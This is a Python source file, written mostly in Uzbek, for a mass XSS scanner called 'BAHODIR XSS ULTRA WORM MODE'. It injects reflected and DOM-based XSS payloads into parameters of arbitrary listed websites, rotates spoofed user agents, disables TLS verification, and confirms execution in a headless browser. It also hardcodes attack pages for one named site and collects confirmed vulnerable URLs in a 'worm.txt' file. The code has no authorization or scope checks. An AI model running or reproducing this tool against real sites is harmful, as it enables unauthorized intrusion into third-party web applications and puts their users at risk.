#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import time
import warnings
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright

warnings.filterwarnings('ignore')

print("\n" + "="*85)
print(" BAHODIR XSS ULTRA v22.2 - WORM MODE + DOM XSS")
print(" Headless + worm.txt + DOM-based XSS + Optimized")
print("="*85 + "\n")

# ------------------- CRITICAL PARAMS -------------------
CRITICAL_PARAMS = [
    'q', 's', 'search', 'query', 'id', 'page', 'cat', 'keyword', 'tipo', 'specialita',
    'platname', 'idP', 'pid', 'action', 'do', 'name', 'user', 'email', 'url', 'redirect',
    'return', 'next', 'term', 'find', 'text', 'message', 'error', 'lang', 'callback'
]

# ------------------- KUCHLI PAYLOADS -------------------
XSS_PAYLOADS = [
    ("<svg/onload=alert('BAHODIR_101')>", "svg"),
    ("<img src=x onerror=alert('BAHODIR_101')>", "img"),
    ("\"><svg/onload=alert('BAHODIR_101')>", "break_svg"),
    ("<script>alert('BAHODIR_101')</script>", "classic"),
    ("javascript:alert('BAHODIR_101')", "js"),
    ("' onclick=alert('BAHODIR_101')//", "attr"),
    ("<details open ontoggle=alert('BAHODIR_101')>", "details"),
    # DOM XSS uchun
    ("#<svg/onload=alert('BAHODIR_101')>", "dom_hash"),
    ("javascript:alert('BAHODIR_101')#", "dom_js"),
]

RESULTS_FILE = "natijalar.txt"
VERIFIED_FILE = "verified_xss.txt"
WORM_FILE = "worm.txt"

def log_result(message, file=RESULTS_FILE, also_print=True):
    with open(file, "a", encoding="utf-8") as f:
        f.write(message + "\n")
    if also_print:
        print(message)

def log_worm(vuln_url, payload_type=""):
    """Real zaiflikni worm.txt ga yozish"""
    with open(WORM_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{payload_type}] {vuln_url}\n")
    print(f"   🐛 WORM → {vuln_url[:80]}...")

def normalize_url(url):
    url = url.strip()
    if not url.startswith("http"):
        return [f"https://{url}", f"http://{url}"]
    return [url]

def fast_check(url):
    try:
        headers = {"User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
        ])}
        resp = requests.get(url, timeout=6, verify=False, headers=headers)
        return resp.status_code < 400, resp.text
    except:
        return False, None

def get_params_fast(html, base_url):
    params = set(CRITICAL_PARAMS)
    try:
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            for inp in form.find_all(['input', 'textarea', 'select']):
                if inp.get('name'):
                    params.add(inp['name'])
        for a in soup.find_all('a', href=True):
            parsed = urlparse(urljoin(base_url, a['href']))
            params.update(parse_qs(parsed.query).keys())
        for hidden in soup.find_all('input', type='hidden'):
            if hidden.get('name'):
                params.add(hidden['name'])
    except:
        pass
    return list(params)[:18]

def verify_with_browser(test_url, is_dom=False):
    """BACKGROUND browser tekshiruvi (DOM XSS qo'llab-quvvatlanadi)"""
    alert_triggered = False
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent=random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36"
                ]),
                ignore_https_errors=True
            )
            page = context.new_page()
            
            # Alert handler
            def handle_dialog(dialog):
                nonlocal alert_triggered
                if "BAHODIR_101" in dialog.message:
                    alert_triggered = True
                dialog.dismiss()
            
            page.on("dialog", handle_dialog)
            
            # JavaScript override (DOM XSS uchun)
            page.add_init_script("""
                window.xss_triggered = false;
                window.alert = function(msg) {
                    if (msg.indexOf('BAHODIR_101') !== -1) {
                        window.xss_triggered = true;
                    }
                };
                window.confirm = window.alert;
                window.prompt = window.alert;
            """)
            
            # URL ga o'tish
            try:
                page.goto(test_url, timeout=12000, wait_until="domcontentloaded")
            except:
                page.goto(test_url, timeout=12000, wait_until="commit")
            
            # DOM XSS uchun biroz ko'proq kutish
            time.sleep(1.5 if is_dom else 1.0)
            
            # Dialog orqali tekshirish
            if alert_triggered:
                browser.close()
                return True
            
            # JavaScript orqali tekshirish
            js_triggered = page.evaluate("() => window.xss_triggered")
            browser.close()
            return js_triggered
            
    except Exception as e:
        return False

def test_reflected_xss(base_url, param, payload, pname):
    """Reflected XSS testi"""
    try:
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        query_params[param] = [payload]
        test_url = parsed._replace(query=urlencode(query_params, doseq=True)).geturl()
        
        resp = requests.get(test_url, timeout=4, verify=False)
        
        if any(x in resp.text for x in ["BAHODIR_101", "alert('BAHODIR_101')"]):
            if verify_with_browser(test_url, is_dom=False):
                return True, param, payload, pname, test_url, "Reflected"
    except:
        pass
    return False, None, None, None, None, None

def test_dom_xss(base_url, param, payload, pname):
    """DOM-based XSS testi (hash orqali)"""
    try:
        # DOM XSS uchun hash (#) qo'shib yuborish
        if payload.startswith('#'):
            test_url = base_url + payload
        else:
            test_url = base_url + "#" + payload
        
        if verify_with_browser(test_url, is_dom=True):
            return True, param, payload, pname, test_url, "DOM-based"
    except:
        pass
    return False, None, None, None, None, None

def scan_site_fast(base_url, html):
    print(f"\n🎯 {base_url}")
    log_result(f"\n{'='*75}", RESULTS_FILE, also_print=False)
    log_result(f"TARGET: {base_url}", RESULTS_FILE, also_print=False)
    log_result(f"{'='*75}", RESULTS_FILE, also_print=False)
    
    params = get_params_fast(html, base_url)
    print(f"   📊 {len(params)} parametr topildi")
    
    # Testlarni tayyorlash
    tasks = []
    for param in params:
        for payload, pname in XSS_PAYLOADS:
            # Reflected XSS
            tasks.append(('reflected', base_url, param, payload, pname))
            # DOM XSS (faqat hash bilan ishlaydigan payloadlar)
            if payload.startswith('#') or 'javascript:' in payload:
                tasks.append(('dom', base_url, param, payload, pname))
    
    found = []
    total = len(tasks)
    completed = 0
    
    print("   🔬 XSS testlari...")
    
    with ThreadPoolExecutor(max_workers=12) as executor:
        futures = []
        for task in tasks:
            if task[0] == 'reflected':
                futures.append(executor.submit(test_reflected_xss, task[1], task[2], task[3], task[4]))
            else:
                futures.append(executor.submit(test_dom_xss, task[1], task[2], task[3], task[4]))
        
        for future in as_completed(futures):
            completed += 1
            is_vuln, param, payload, pname, test_url, vuln_type = future.result()
            
            if completed % 20 == 0 or completed == total:
                print(f"\r   ⏳ {completed}/{total} ({completed*100//total}%)", end='', flush=True)
            
            if is_vuln:
                found.append({
                    'param': param,
                    'payload': payload,
                    'pname': pname,
                    'url': test_url,
                    'type': vuln_type
                })
                
                msg = f"\n   🔴 XSS TOPILDI! [{vuln_type}] {pname} → {param}"
                print(msg)
                log_result(msg, RESULTS_FILE)
                log_result(f"      URL: {test_url}", RESULTS_FILE)
                log_result(f"      Payload: {payload}", RESULTS_FILE)
                log_result(f"      ✓ Browser tasdiqlangan", VERIFIED_FILE)
                
                # worm.txt ga saqlash
                log_worm(test_url, vuln_type)
    
    print(f"\n   ✅ {len(found)} ta real XSS zaifligi")
    log_result(f"\nXULOSA: {len(found)} ta XSS topildi", RESULTS_FILE, also_print=False)
    
    return found

def scan_special_pages(base_url):
    """Maxsus sahifalar (h2biz.net uchun)"""
    found = []
    special_pages = ["/php_results.php", "/search.php"]
    
    for page in special_pages:
        special_url = base_url.rstrip('/') + page
        try:
            resp = requests.get(special_url, timeout=5, verify=False)
            if resp.status_code == 200:
                for param in ['platname', 'tipo', 'specialita']:
                    for payload, pname in XSS_PAYLOADS[:8]:
                        try:
                            parsed = urlparse(special_url)
                            params = parse_qs(parsed.query)
                            params[param] = [payload]
                            test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                            
                            if verify_with_browser(test_url, is_dom=False):
                                found.append({
                                    'param': param,
                                    'payload': payload,
                                    'pname': pname,
                                    'url': test_url,
                                    'type': 'Special Page'
                                })
                                print(f"\n   🔴 MAXSUS SAHIFA: {special_url} -> {param}")
                                log_worm(test_url, "Special")
                        except:
                            pass
        except:
            pass
    return found

def main():
    # Fayllarni tozalash
    for file in [RESULTS_FILE, VERIFIED_FILE, WORM_FILE]:
        with open(file, "w", encoding="utf-8") as f:
            f.write(f"BAHODIR XSS v22.2 - {time.ctime()}\n")
            f.write("="*60 + "\n\n")
    
    urls = []
    if not sys.stdin.isatty():
        urls = [line.strip() for line in sys.stdin.read().splitlines() if line.strip() and not line.startswith('#')]
    elif len(sys.argv) >= 2:
        try:
            with open(sys.argv[1], 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            print(f"❌ Fayl topilmadi: {sys.argv[1]}")
            sys.exit(1)
    
    if not urls:
        print("❌ Saytlar ro'yxati kerak!")
        sys.exit(1)
    
    print(f"🔍 Jami {len(urls)} ta sayt\n")
    
    all_results = {}
    start_time = time.time()
    
    for idx, item in enumerate(urls, 1):
        print(f"[{idx}/{len(urls)}] {item}")
        log_result(f"[{idx}] {item}", RESULTS_FILE, also_print=False)
        
        scanned = False
        for test_url in normalize_url(item):
            print(f"   🔌 {test_url}", end=' ')
            alive, html = fast_check(test_url)
            if alive and html:
                print("✅ ONLINE")
                log_result(f"   Status: ONLINE", RESULTS_FILE, also_print=False)
                
                results = scan_site_fast(test_url, html)
                
                if 'h2biz' in test_url:
                    special_results = scan_special_pages(test_url)
                    results.extend(special_results)
                
                if results:
                    all_results[test_url] = results
                scanned = True
                break
            else:
                print("❌ OFFLINE")
                log_result(f"   Status: OFFLINE", RESULTS_FILE, also_print=False)
        
        if not scanned:
            log_result(f"   Status: OFFLINE", RESULTS_FILE, also_print=False)
    
    elapsed = time.time() - start_time
    total_vulns = sum(len(v) for v in all_results.values())
    
    print("\n" + "="*85)
    print(" BAHODIR - YAKUNIY HISOBOT")
    print("="*85)
    print(f"\n📊 Jami tekshirilgan: {len(urls)} ta")
    print(f"🔴 Real XSS zaifliklar: {total_vulns} ta")
    print(f"⏱ Vaqt: {elapsed:.1f} sekund ({elapsed/60:.1f} minut)")
    
    print(f"\n📁 Saqlangan fayllar:")
    print(f"   📄 {RESULTS_FILE} -> Hamma jarayon")
    print(f"   ✓ {VERIFIED_FILE} -> Tasdiqlangan XSS")
    print(f"   🐛 {WORM_FILE} -> FAQAT REAL ISHLAGANLAR!")
    
    print("\n⚡ BAHODIR tugatdi. RAZGON!\n")

if __name__ == '__main__':
    main()
